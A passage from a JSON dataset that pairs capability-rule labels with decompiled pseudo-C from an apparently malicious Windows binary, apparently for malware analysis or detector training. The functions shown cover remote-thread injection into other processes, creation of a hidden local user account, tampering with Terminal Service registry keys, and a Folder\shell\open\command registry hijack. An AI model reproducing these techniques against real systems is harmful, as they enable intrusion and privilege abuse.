       iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4);\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&var_14h, &var_10h, &lpPipeAttributes, 0);\n            if (iVar3 != 0) {\n                uVar4 = (*pcVar1)(0x419560, 0, 0, 2);\n                uVar4 = (*pcVar1)(hReadPipe, uVar4);\n                iVar3 = (*pcVar2)(uVar4);\n                if (iVar3 != 0) {\n                    uVar4 = (*pcVar1)(0x419564, 0, 0, 2);\n                    uVar4 = (*pcVar1)(var_10h, uVar4);\n                    iVar3 = (*pcVar2)(uVar4);\n                    if (iVar3 != 0) {\n                        fcn.0040ec8c();\n                        fcn.0040ec8c();\n                        arg_8h_00 = &arg_8h;\n                        uVar4 = extraout_ECX;\n                        arg_10h = hWritePipe;\n                        arg_14h = var_14h;\n                        fcn.0040362d(arg_8h_00);\n                        iVar3 = fcn.0040e891(arg_8h_00, uVar4, arg_10h, arg_14h);\n                        if (iVar3 != 0) {\n                            fcn.0040ec8c();\n                            fcn.0040ec8c();\n                            fcn.0040ec8c();\n                            *0x419568 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n                            *0x41956c = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040e92a, 0x419558, 0, 0x419570)\n                            ;\n                            if (*0x41956c != 0) goto code_r0x0040ec7b;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    fcn.0040ec8c();\n    fcn.0040ea89();\n    uVar5 = 0;\ncode_r0x0040ec7b:\n    fcn.00405ea5();\n    return uVar5;\n}\n",
        "token_count": 908
    },
    "0040f432": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f432(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00401085(0x108);\n    if ((iVar1 == 0) || (param_1 == 0)) {\n        fcn.00401099(iVar1);\n        uVar2 = 0;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar1, param_1);\n        *(iVar1 + 0x104) = param_2;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040ee44, iVar1, 0, 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "00411fd8": {
        "rules": [
            "create thread",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "open process",
            "write process memory",
            "inject thread",
            "spawn thread to RWX shellcode"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411fd8(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_10ch;\n    uint var_108h;\n    uint lpflOldProtect;\n    uint hProcess;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, param_2);\n    hProcess = uVar3;\n    var_10ch = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar4 = fcn.00401085(0xff);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, uVar4, 0xff);\n    fcn.00401172(&var_108h, uVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(uVar3, 0, 0x800, 0x3000, 0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteProcessMemory;\n    (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar3, iVar5, 0x419158, 0x800, 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(hProcess, iVar5, 0x800, 0x40, &lpflOldProtect);\n    uVar3 = (*pcVar2)(hProcess, 0, 0x103, 0x3000, 4);\n    (*pcVar1)(hProcess, uVar3, &var_10ch, 0x103, 0);\n    *0x54cbec = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(hProcess, 0, 0, iVar5 + 0x10e, uVar3, 0, 0);\n    return;\n}\n",
        "token_count": 446
    },
    "0040d508": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d508(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    uVar5 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 0x10);\n    if (iVar3 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n    if (iVar4 == 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x420) goto code_r0x0040d578;\n        (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n        if (iVar4 == 0) goto code_r0x0040d578;\n    }\n    uVar5 = 1;\ncode_r0x0040d578:\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    (*pcVar1)(iVar3);\n    return uVar5;\n}\n",
        "token_count": 371
    },
    "0040fd93": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040fd93(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 61
    },
    "0041026f": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0041026f(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 61
    },
    "00411d0c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411d0c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(1);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    return (iVar1 * (arg_8h * 0x359 + 1)) % 10000;\n}\n",
        "token_count": 86
    },
    "00402650": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402650(uint param_1, int32_t param_2)\n\n{\n    uint lpFile;\n    \n    if (*(param_2 + 4) == 0) {\n        fcn.0040362d(param_2 + 8);\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x414688, param_1, 0, 0, 5);\n        fcn.00405ea5();\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "004037a1": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004037a1(uint arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = arg_8h;\n    in_ECX[1] = 0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "004049ab": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049ab(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x414828;\n    fcn.0040362d(&arg_8h);\n    in_ECX[2] = arg_ch;\n    *(in_ECX + 3) = arg_10h;\n    fcn.0040362d(&arg_14h);\n    fcn.00401361(&arg_18h);\n    fcn.00405ea5();\n    arg_14h = 0;\n    fcn.00405ea5();\n    arg_8h = 0;\n    if (arg_18h != 0) {\n        fcn.00401ad5(arg_18h);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00405e22": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405e22(uint param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    fcn.00405f31(param_1);\n    return uVar1;\n}\n",
        "token_count": 75
    },
    "00405eb4": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405eb4(uint param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    return;\n}\n",
        "token_count": 49
    },
    "004060aa": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060aa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_108h;\n    uint var_8h;\n    \n    fcn.0040304c(&arg_10h);\n    iVar1 = 0;\n    do {\n        *(&var_108h + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x100);\n    fcn.0040600e(arg_ch);\n    fcn.00405fa1(arg_14h);\n    fcn.0040304c(&arg_10h);\n    fcn.00403036();\n    fcn.00403036();\n    fcn.00403036();\n    return;\n}\n",
        "token_count": 182
    },
    "00410cf6": {
        "rules": [
            "open process",
            "terminate process"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410cf6(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, param_1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "00409d9a": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint fcn.00409d9a(void)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\\\\Aerofox\\\\FoxmailPreview\", 0, 0x20019, &hKey);\n    if (iVar1 == 0) {\n        var_4h = 0x104;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, \"Executable\", 0, 0, 0x4197b0, &var_4h);\n        if (iVar1 == 0) {\n            (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecA)(0x4197b0);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "0040d9b6": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.0040d9b6(void)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint arg_8h;\n    uint uVar2;\n    char16_t *arg_ch;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpSubKey;\n    uint var_ch;\n    uint phkResult;\n    \n    uVar2 = 0;\n    phkResult = 0;\n    fcn.004035e5(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_18h = 0;\n    var_14h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x102, &phkResult);\n    if (iVar1 == 0) {\n        arg_10h = fcn.00403221(&var_20h);\n        arg_ch = L\"ServiceDll\";\n        arg_8h = fcn.004035e5(L\"ServiceDll\");\n        iVar1 = fcn.00411039(arg_8h, arg_ch, arg_10h);\n        fcn.00405ea5();\n        var_ch = 0;\n        fcn.00403036();\n        fcn.00410fae();\n        if (iVar1 != 0) {\n            uVar2 = 1;\n        }\n    }\n    fcn.00403036();\n    fcn.00405ea5();\n    fcn.00410fae();\n    return uVar2;\n}\n",
        "token_count": 353
    },
    "0040dcb2": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nvoid fcn.0040dcb2(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *pcVar4;\n    uint *puVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpSubKey;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    fcn.004035e5(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\");\n    fcn.004035e5(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_20h = 0;\n    var_1ch = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar2 != 0) goto code_r0x0040ddfb;\n    puVar5 = &var_20h;\n    pcVar4 = L\"ImagePath\";\n    uVar3 = fcn.004035e5(L\"ImagePath\");\n    iVar2 = fcn.00410fc3(uVar3, pcVar4);\n    fcn.00405ea5(uVar3, pcVar4, puVar5);\n    fcn.00410fae();\n    if (iVar2 == 0) goto code_r0x0040ddfb;\n    fcn.00402ecf(&var_8h);\n    fcn.00402fc3();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrW;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrW)(var_8h, L\"svchost.exe\");\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(var_8h, L\"svchost.exe -k\");\n        if (iVar2 != 0) goto code_r0x0040dd6f;\n    }\n    else {\ncode_r0x0040dd6f:\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, var_10h, 0, 0x20119, &phkResult);\n        if (iVar2 == 0) {\n            pcVar4 = L\"ServiceDll\";\n            uVar3 = fcn.004035e5(L\"ServiceDll\");\n            iVar2 = fcn.00410fc3(uVar3, pcVar4);\n            fcn.00405ea5();\n            if (iVar2 != 0) {\n                fcn.00402ecf(&var_18h);\n                uVar3 = fcn.004031d4();\n                fcn.00403437(uVar3);\n                fcn.00405ea5();\n                var_ch = 0;\n                fcn.00405ea5();\n            }\n            fcn.00410fae();\n        }\n    }\n    fcn.00405ea5();\n    var_8h = 0;\ncode_r0x0040ddfb:\n    fcn.00403036();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00410fae();\n    return;\n}\n",
        "token_count": 737
    },
    "0040de1f": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.0040de1f(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint uVar4;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint lpSubKey;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    fcn.004035e5(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_14h = 0;\n    var_10h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar1 == 0) {\n        puVar3 = &var_14h;\n        arg_ch = L\"ServiceDll\";\n        uVar2 = fcn.004035e5(L\"ServiceDll\");\n        iVar1 = fcn.00410fc3(uVar2, arg_ch);\n        fcn.00405ea5(uVar2, arg_ch, puVar3);\n        if (iVar1 != 0) {\n            uVar4 = 0x54e054;\n            puVar3 = &var_8h;\n            fcn.00402ecf(puVar3);\n            uVar2 = fcn.00403248(puVar3);\n            fcn.00405ea5(puVar3, uVar4);\n            var_8h = 0;\n            goto code_r0x0040de8d;\n        }\n        fcn.00410fae();\n    }\n    uVar2 = 0;\ncode_r0x0040de8d:\n    fcn.00403036();\n    fcn.00405ea5();\n    fcn.00410fae();\n    return uVar2;\n}\n",
        "token_count": 421
    },
    "0041106c": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041106c(uint hKey, uint *arg_ch, uint samDesired, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_14h != 0) && (iVar1 = fcn.0040f731(),  iVar1 == 0)) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, *arg_ch, 0, 0, 0, samDesired, 0);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00410fae();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, *arg_ch, 0, samDesired);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 200
    },
    "00411855": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411855(uint lpValueName, uint lpString)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint hKey;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                      (0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\", 0, 0x20006, &hKey);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, lpValueName, 0, 1, lpString, uVar1);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_SetLastError)(iVar2);\n    return 0;\n}\n",
        "token_count": 217
    },
    "004118ba": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.004118ba(void)\n\n{\n    int32_t iVar1;\n    uint pSecurityDescriptor;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&pSecurityDescriptor, 1);\n    if ((iVar1 != 0) &&\n       (iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(&pSecurityDescriptor, 1, 0, 0),  iVar1 != 0)) {\n        var_10h = &pSecurityDescriptor;\n        var_14h = 0xc;\n        var_ch = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\", 0, 0, 0, 0x20006, &var_14h, \n                           &hKey, &var_8h);\n        if (iVar1 == 0) {\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 293
    },
    "004119c9": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.004119c9(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint phkResult;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, 0x41726c, 0, 0xf003f, &phkResult);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, 0x41726c, 0, 0, 0, 0xf003f, 0, &phkResult, &var_8h);\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x54cbf0);\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(phkResult, 0x41728c, 0, 1, 0x54cbf0, iVar1 << 2);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    return;\n}\n",
        "token_count": 240
    },
    "0040cc54": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cc54(uint *pcbBinary)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar2;\n    uint pszString;\n    \n    iVar2 = 0;\n    *pcbBinary = 0;\n    *in_EDX = 0;\n    iVar1 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryW)();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, *pcbBinary);\n        *in_EDX = iVar1;\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryW)(in_ECX, 0, 1, iVar1, pcbBinary, 0, 0);\n            if (iVar2 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LocalFree)(*in_EDX);\n                *in_EDX = iVar1;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 240
    },
    "0040d418": {
        "rules": [
            "add user account"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d418(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h;\n    puVar3 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_20h = *arg_8h;\n    var_14h = 1;\n    var_10h = 0;\n    var_1ch = *arg_ch;\n    var_ch = 0;\n    var_8h = 0x10201;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.NETAPI32.dll_NetUserAdd)(0, 1, &var_20h, 0);\n    if (iVar2 == 0) {\n        arg_8h = *puVar1;\n        puVar1 = fcn.0040f56d();\n        iVar2 = (*_sym.imp.NETAPI32.dll_NetLocalGroupAddMembers)(0, *puVar1, 3, &arg_8h, 1);\n        fcn.00405ea5();\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 368
    },
    "0041094e": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.0041094e(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(in_FS_OFFSET + 0x30) != 0) {\n        return *(***(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00411ed8": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411ed8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00401133(arg_8h);\n    iVar2 = 0;\n    if (0 < in_EDX) {\n        do {\n            *(iVar2 + in_ECX) = *(iVar2 + in_ECX) ^ *(iVar2 % iVar1 + arg_8h);\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < in_EDX);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00401133": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00401133(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    return pcVar2 + (-1 - param_1);\n}\n",
        "token_count": 89
    },
    "00401172": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00401172(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *param_2;\n        *pcVar2 = cVar1;\n        pcVar2 = pcVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (cVar1 != '\\0');\n    return param_1;\n}\n",
        "token_count": 110
    },
    "00402481": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402481(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    \n    uVar4 = in_ECX[2];\n    if (uVar4 < in_ECX[1]) {\n        iVar3 = *in_ECX;\n    }\n    else {\n        iVar1 = uVar4 + 1;\n        iVar2 = in_ECX[3];\n        iVar3 = fcn.00405f53();\n        uVar4 = 0;\n        if (in_ECX[2] != 0) {\n            do {\n                *(iVar3 + uVar4 * 4) = *(*in_ECX + uVar4 * 4);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < in_ECX[2]);\n        }\n        uVar4 = in_ECX[2];\n        in_ECX[1] = iVar1 * iVar2;\n        *in_ECX = iVar3;\n    }\n    *(iVar3 + uVar4 * 4) = arg_8h;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 282
    },
    "00405d85": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405d85(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    \n    if (*0x54e01c != 0) {\n        uVar1 = 0;\n        uVar2 = *0x54d0e4 + *0x54e01c + (3 - *0x54d0e4) >> 2;\n        if (*0x54d0e4 + *0x54e01c < *0x54d0e4) {\n            uVar2 = 0;\n        }\n        ppcVar3 = *0x54d0e4;\n        if (uVar2 != 0) {\n            do {\n                if (*ppcVar3 != NULL) {\n                    (**ppcVar3)();\n                }\n                ppcVar3 = ppcVar3 + 1;\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < uVar2);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00405f10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f10(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uchar *in_EDX;\n    int32_t iVar1;\n    \n    if (arg_8h != 0) {\n        iVar1 = in_ECX - in_EDX;\n        do {\n            in_EDX[iVar1] = *in_EDX;\n            in_EDX = in_EDX + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0040cb67": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cb67(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    if ((param_1 != 0) && (param_2 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, param_2 * 2 + 2);\n        if ((iVar1 != 0) && (param_2 != 0)) {\n            do {\n                *(iVar1 + uVar2 * 2) = *(uVar2 + param_1);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < param_2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 186
    },
    "0041044f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041044f(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    fcn.0040fece();\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    iVar3 = 5;\n    *(param_1 + 0x38) = 5;\n    *(param_1 + 0x30) = 5;\n    *(param_1 + 0x34) = 0;\n    puVar1 = fcn.00405f53();\n    if (puVar1 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar1 + 0xb;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar3 = iVar3 + -1;\n            puVar1 = puVar1 + 0xc;\n        } while (iVar3 != 0);\n    }\n    *(param_1 + 0x2c) = puVar2;\n    *(param_1 + 0x3c) = 0;\n    return param_1;\n}\n",
        "token_count": 302
    },
    "00412447": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00412447(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    iVar2 = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    ppv = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4145e0, 0, 1, 0x414590, &ppv);\n    if (ppv != NULL) {\n        (**(*ppv + 0xc))(ppv, 0x4145d0, &var_4h, 0);\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x14))(var_4h);\n            while( true ) {\n                iVar1 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, 0);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 1;\n                if (var_ch != NULL) {\n                    (**(*var_ch + 8))(var_ch);\n                    var_ch = NULL;\n                }\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 8))(var_4h);\n                var_4h = NULL;\n            }\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return iVar2;\n}\n",
        "token_count": 357
    },
    "004126bf": {
        "rules": [
            "contain loop"
        ],
